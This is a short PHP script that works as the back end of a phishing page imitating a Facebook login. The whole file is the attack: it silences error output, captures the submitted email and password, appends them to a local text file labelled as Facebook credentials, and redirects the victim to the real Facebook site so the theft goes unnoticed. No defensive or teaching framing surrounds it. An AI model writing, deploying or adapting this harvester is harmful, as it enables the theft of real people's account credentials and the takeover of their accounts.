<?php
ini_set('display_errors', 0); // Ne pas afficher les erreurs
error_reporting(0);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $log = "Facebook Email: " . $email . " | Password: " . $password . "\n";
    file_put_contents("usernames.txt", $log, FILE_APPEND);

    header("Location: https://www.facebook.com/ ");
    exit();
}
?>
